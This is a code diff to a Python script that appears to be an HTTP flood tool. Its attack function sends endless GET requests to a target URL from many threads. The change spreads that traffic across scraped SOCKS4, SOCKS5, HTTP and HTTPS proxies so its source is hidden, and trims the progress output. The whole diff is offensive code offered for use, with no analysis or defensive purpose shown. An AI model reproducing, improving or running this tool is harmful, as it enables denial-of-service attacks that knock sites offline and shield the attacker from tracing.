@@ -18,9 +18,9 @@ async def attack(url, session) -> None:
     global https_proxies
     global sent
 
-    r = session.get(url, headers={"User-Agent": "Sym", "Accept-Encoding": "deflate"}, proxies={"socks5": socks5_proxies})
+    r = session.get(url, headers={"User-Agent": "Sym", "Accept-Encoding": "deflate"}, proxies={"socks5": socks5_proxies, "socks4": socks4_proxies, "http": http_proxies, "https": https_proxies})
     sent+=1
-    print(f"{sent} // Status: {r.status_code} // {r.proxies.get("socks5")}")
+    print(f"{sent} // Status: {r.status_code}")
 
 def init(url, session) -> None:
     while 1:
@@ -28,14 +28,18 @@ def init(url, session) -> None:
 
 if __name__ == "__main__":
 
-    # Perform a default scrape of the proxio module
-    proxies_array = default_scrape()
+    scraper = Scrape()
+    scraped = scraper.scrape_proxies()
+    scraper.write_to_txt(scraped)
+    proxies_array = scraper.structure()
+    print('SCRAPED')
 
     # Step 4: Filter Proxies into their own seperate arrays
     socks4_proxies = Filter.filter_socks4_proxies(proxies_array)
     socks5_proxies = Filter.filter_socks5_proxies(proxies_array)
-    http_proxies = Filter.filter_http_proxies(proxies_array)
-    https_proxies = Filter.filter_https_proxies(proxies_array)
+    http_proxies   = Filter.filter_http_proxies(proxies_array)
+    https_proxies  = Filter.filter_https_proxies(proxies_array)
+    print('FILTERED')
         
     threads = []
 
